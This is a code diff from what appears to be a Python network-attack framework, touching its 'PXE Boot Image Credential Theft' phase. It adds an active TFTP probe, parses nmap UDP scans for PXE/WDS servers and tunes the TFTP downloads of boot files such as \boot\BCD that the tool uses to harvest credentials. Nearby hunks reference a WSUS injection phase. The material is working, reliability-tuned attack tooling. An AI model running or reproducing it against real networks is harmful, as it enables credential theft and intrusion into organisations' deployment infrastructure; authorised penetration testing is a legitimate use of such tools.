@@ -4406,8 +4406,38 @@ def run_wsus_inject(cfg: Config) -> bool:
 # Phase 6: PXE Boot Image Credential Theft
 # ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
 
+def _tftp_responds(ip: str, timeout: float = 2.0) -> bool:
+    """Actively confirm a host is really a TFTP server.
+
+    nmap's UDP scan reports a non-responding port as ``open|filtered`` — that is
+    NOT proof of a server, and treating it as one flagged ordinary Windows
+    workstations (which emit PXE-like DHCP options at boot) as "PXE servers",
+    then hung on TFTP GETs against them. A real TFTP server answers a read
+    request with a DATA (opcode 3) or ERROR (opcode 5) packet; anything else is
+    not a server.
+    """
+    import socket
+    # RRQ: opcode 0x0001 | filename | 0x00 | "octet" | 0x00
+    rrq = b"\x00\x01" + b"\\pxe-probe" + b"\x00" + b"octet" + b"\x00"
+    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+    s.settimeout(timeout)
+    try:
+        s.sendto(rrq, (ip, 69))
+        data, _ = s.recvfrom(1024)
+        return len(data) >= 2 and data[0] == 0x00 and data[1] in (0x03, 0x05)
+    except OSError:
+        return False
+    finally:
+        s.close()
+
+
 def detect_pxe_server(cfg: Config) -> str:
-    """Discover PXE/WDS server via nmap scan for TFTP (port 69) and WDS (UDP 4011)."""
+    """Discover PXE/WDS server via nmap, then CONFIRM with an active TFTP probe.
+
+    nmap alone gives false positives on UDP (`open|filtered` for non-responders),
+    so its output is only used to narrow candidates; each is verified with a real
+    TFTP read request before being declared a server. See L2 testing notes.
+    """
     log.info("🔍 Scanning for PXE/WDS servers (TFTP port 69, WDS port 4011)...")
 
     if not tool_exists("nmap"):
@@ -4422,14 +4452,36 @@ def detect_pxe_server(cfg: Config) -> str:
         ["nmap", "-sU", "-n", "-Pn", "--open", "-p", "69,4011", target],
         cfg, timeout=120
     )
-    hosts = re.findall(
-        r"Nmap scan report for (\d+\.\d+\.\d+\.\d+).*?(?:69|4011)/udp\s+open",
-        result.stdout, re.DOTALL
-    )
-    if hosts:
-        pxe = hosts[0]
-        ok(f"PXE/TFTP server found: {pxe}")
-        return pxe
+
+    # Parse per host. A candidate is any host where 69/udp is not closed (nmap
+    # says open or open|filtered); a WDS/SCCM ProxyDHCP hit is 4011/udp in state
+    # *exactly* open (a genuine response, never open|filtered).
+    tftp_candidates: list[str] = []
+    wds_confirmed: list[str] = []
+    current = ""
+    for line in result.stdout.splitlines():
+        m = re.match(r"Nmap scan report for (?:.*\()?(\d+\.\d+\.\d+\.\d+)", line)
+        if m:
+            current = m.group(1)
+            continue
+        if not current:
+            continue
+        if re.match(r"69/udp\s+open", line):          # open OR open|filtered
+            tftp_candidates.append(current)
+        if re.match(r"4011/udp\s+open\b", line) and "open|filtered" not in line:
+            wds_confirmed.append(current)             # real ProxyDHCP response
+
+    # Confirm TFTP candidates with an actual RRQ — this is what rejects the
+    # workstation false positive.
+    for ip in tftp_candidates:
+        if _tftp_responds(ip):
+            ok(f"PXE/TFTP server confirmed: {ip}")
+            return ip
+        log.debug(f"  {ip}: nmap flagged 69/udp but no TFTP reply — ignoring")
+
+    if wds_confirmed:
+        ok(f"WDS/SCCM ProxyDHCP server found: {wds_confirmed[0]}")
+        return wds_confirmed[0]
 
     log.warning("No PXE/TFTP server detected on network")
     return ""
@@ -4548,6 +4600,12 @@ def _manual_tftp_extract(pxe_server: str, pxe_dir: Path, cfg: Config) -> bool:
     """
     got_creds = False
 
+    # Final guard: never hammer TFTP GETs at a host that is not actually a TFTP
+    # server (each miss otherwise blocks for the client's full retry window).
+    if not _tftp_responds(pxe_server):
+        log.warning(f"{pxe_server} does not answer TFTP — not a PXE server, skipping")
+        return False
+
     # Common PXE files to attempt downloading via TFTP
     tftp_files = [
         r"\boot\BCD",
@@ -4574,12 +4632,12 @@ def _manual_tftp_extract(pxe_server: str, pxe_dir: Path, cfg: Config) -> bool:
             result = run(
                 ["atftp", "--get", "--remote-file", remote_path,
                  "--local-file", str(local_path), pxe_server],
-                cfg, timeout=60
+                cfg, timeout=20
             )
         else:
             result = run(
                 ["tftp", pxe_server, "-c", "get", remote_path, str(local_path)],
-                cfg, timeout=60
+                cfg, timeout=20
             )
 
         if local_path.exists() and local_path.stat().st_size > 0:
